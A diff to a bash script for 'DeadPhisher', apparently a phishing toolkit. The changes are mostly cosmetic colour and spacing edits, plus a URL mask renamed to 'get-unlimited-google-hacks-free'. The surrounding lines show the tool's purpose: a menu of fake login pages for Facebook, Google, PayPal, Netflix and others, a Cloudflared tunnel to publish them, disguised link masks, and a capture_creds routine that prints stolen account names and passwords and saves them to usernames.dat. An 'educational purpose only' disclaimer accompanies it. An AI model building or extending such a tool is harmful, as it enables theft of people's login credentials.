@@ -73,7 +73,7 @@ kill_pid() {
 banner() {
 	cat <<- EOF
  {ORANGE}    
-                 ⠀.⠀⢀⠀⠀⠄⢀⠂⠠⠐⡀⢀⠂⠀⠄⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                 ⠀ .⠀⢀⠀⠀⠄⢀⠂⠠⠐⡀⢀⠂⠀⠄⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠄⠂⠌⠠⢁⠂⠌⠄⡈⠄⠀⠁⠀⠄⠀⠈⠐⠈⡐⠠⢁⠊⠄⡐⠠⠀⠂⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠴⠋⠄⢂⠡⡐⢈⡐⠨⠐⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡀⠠⠁⠂⠌⠐⡀⠣⠌⡐⠠⢀⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢋⡐⢂⠌⣂⠢⠐⢂⠐⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡀⠁⠄⢃⡐⠠⡑⣀⠢⠐⡈⠳⣄⠀⠀⠀⠀⠀⠀
@@ -81,7 +81,7 @@ banner() {
 ⠀⠀⠀⠀⠀⣰⡏⠣⢌⡌⡡⢌⠡⠁⠌⠠⠁⠈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠂⠡⠐⢀⠊⠄⡡⢃⠰⡁⢆⠹⣆⠀⠀⠀
 ⠀⠀⠀⠀⣰⢏⡰⢉⡒⢤⠑⡂⢂⠁⠂⡀⠁⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⠐⢀⠈⡐⠄⣃⠱⡈⢆⠱⡘⣧⠀⠀
 ⠀⠀⠀⢠⡿⢠⡘⢇⡸⠄⢣⠠⠄⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠠⠀⠤⡀⢇⠸⡘⡄⢣⢸⡇⠀
-⠀⠀⠀⣼⡃⢧⢘⣂⢒⡉⡐⠄⡈⠀⠁⠀⠀⠀⠀      DeadPhisher⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⢁⠂⡅⢊⠦⢱⡈⢇⡊⣧⠀
+⠀⠀⠀⣼⡃⢧⢘⣂⢒⡉⡐⠄⡈⠀⠁⠀⠀⠀⠀      DeadPhisher⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⢁⠂⡅⢊⠦⢱⡈⢇⡊⣧⠀
 ⠀⠀⠀⣿⡘⣆⠣⣄⠣⡐⠰⢀⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⡔⠡⠚⡤⡑⢮⡐⣿⡂
 ⠀⠀⠀⣿⡔⣣⢚⠄⢣⠡⡈⠄⡀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⢀⡐⠠⣁⠳⠰⣉⢦⡑⣿⡁
 ⠀⠀⠀⢿⡲⣅⠎⡘⣄⠣⠐⠤⡐⡰⢠⣡⣦⣶⣾⣷⣾⣷⣿⣷⣶⣦⣀⠣⡐⢄⠆⡰⢄⣆⣳⣼⣶⣿⣶⣷⣶⣦⣽⣖⣦⡁⠤⢠⠑⡄⣊⠱⢌⢲⣯⣿⠀
@@ -196,7 +196,7 @@ install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${RED}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
@@ -231,7 +231,7 @@ about() {
 								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
 
 		${RED}Warning:${WHITE}
-		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
+		${RED}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
@@ -280,9 +280,9 @@ capture_creds() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${SKYBLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${SKYBLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${PURPLE}usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${BROWN}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${GOLD}Ctrl + C ${GOLD}to exit. "
 }
 
 ## Print data
@@ -434,7 +434,7 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='https://get-unlimited-google-photos-free'
+			mask='https://get-unlimited-google-hacks-free'
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
@@ -484,7 +484,7 @@ main_menu() {
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${BLUE}[${BLACK}13${YELLOW}]${WHITE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
 		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
 		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
 		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
